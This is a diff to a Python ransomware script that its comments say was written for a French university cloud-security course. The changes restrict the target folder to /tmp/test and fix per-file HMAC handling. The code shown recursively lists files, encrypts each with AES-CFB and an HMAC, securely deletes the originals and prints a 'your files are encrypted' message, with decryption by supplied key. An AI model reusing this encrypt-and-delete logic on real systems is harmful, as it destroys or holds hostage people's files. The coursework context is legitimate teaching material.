@@ -4,6 +4,8 @@
 #Ce code est un ransomware qui a été développé
 # dans le cadre de l'enseignement CYB_5101A - 
 # Sécurité CLoud.
+#Le code ne fonctionne actuellement que dans 
+# le dossier /tmp/test
 #==========================================
 
 from path import Path
@@ -17,7 +19,7 @@ import sys
 import pyfiglet
 import argparse
 
-parser = argparse.ArgumentParser(description="Ransomware qui peut chiffrer et déchiffrer l'intégralité du dossier /tmp en supprimant de façon sécurisée les fichiers d'origines.")
+parser = argparse.ArgumentParser(description="Ransomware qui peut chiffrer et déchiffrer l'intégralité du dossier /tmp/test en supprimant de façon sécurisée les fichiers d'origines.")
 parser.add_argument("-d", "--dechiffre", type=str ,help="pour effectuéer le déchiffrement, il faut ajouter la clé en paramètre")
 args = parser.parse_args()
 
@@ -26,7 +28,8 @@ def get_file(dossier='.'):
     #==========================================
     #Cette fonction permet de récupérer le path de 
     # l'ensemble des fichiers présent dans le dossier
-    # courant et tous les sous-dossiers
+    # courant (par défaut ou du path passé en paramètre)
+    # et tous ces sous-dossiers
     #==========================================
     files = []
     #Parcours les fichiers
@@ -69,13 +72,12 @@ def chiffrement(fichiers,cle):
     cle     =   kdf[:32]
     cle_mac =   kdf[32:]
 
-    #Création du HMAC qui servira lors du déchiffrement
-    mac = HMAC.new(cle_mac) #calculé par défautl en MD5
-
     for f in fichiers:
         #Génération de l'iv et du cipher pour chaque fichier
         iv = Random.get_random_bytes(16) 
         cipher = AES.new(cle, AES.MODE_CFB, iv)
+        #Création du HMAC qui servira lors du déchiffrement
+        mac = HMAC.new(cle_mac) #calculé par défautl en MD5
 
         #Ouverture du fichier en mode lecture - binaire
         try:
@@ -92,6 +94,7 @@ def chiffrement(fichiers,cle):
             fout.write(mac.digest())
             fout.write(iv)
             fout.write(chiffre)
+        del mac
     del sel
     del kdf
     del cle
@@ -110,10 +113,10 @@ def dechiffrement(fichiers,cle):
     cle     =   kdf[:32]
     cle_mac =   kdf[32:]
 
-    #Création du HMAC pour vérifié l'intégrité du fichier chiffré
-    mac = HMAC.new(cle_mac) #calculé par défautl en MD5
-
     for f in fichiers:
+        #Création du HMAC pour vérifié l'intégrité du fichier chiffré
+        mac = HMAC.new(cle_mac) #calculé par défautl en MD5
+
         #Extraction des données du fichier chiffré
         try:
             with open(f,'rb') as fin:
@@ -139,6 +142,7 @@ def dechiffrement(fichiers,cle):
         #Création du fichier déchiffré avec la bonne extension
         with open(f[:-4],'xb') as fout:
             fout.write(dechiffre)
+        del mac
 
     del sel
     del kdf
@@ -159,13 +163,13 @@ def main():
     #Fonction main du ransomware
     #==========================================
     if args.dechiffre == None:
-        fichier = get_file('/tmp')      #création de la table contenant tout les noms fichiers
-        chiffrement(fichier,get_key())  #Chiffrement de tous les fichiers avec la clé récupéré
-        suppression(fichier)            #Suppresion de tous les fichiers non chiffrés
+        fichier = get_file('/tmp/test')     #création de la table contenant tout les noms fichiers
+        chiffrement(fichier,get_key())      #Chiffrement de tous les fichiers avec la clé récupéré
+        suppression(fichier)                #Suppresion de tous les fichiers non chiffrés
         signature("Tous vos fichiers ont été chiffré")
 
     else:
-        fichier =   get_file('/tmp')
+        fichier =   get_file('/tmp/test')
         dechiffrement(fichier,args.dechiffre)
         suppression(fichier)
         signature("Success")
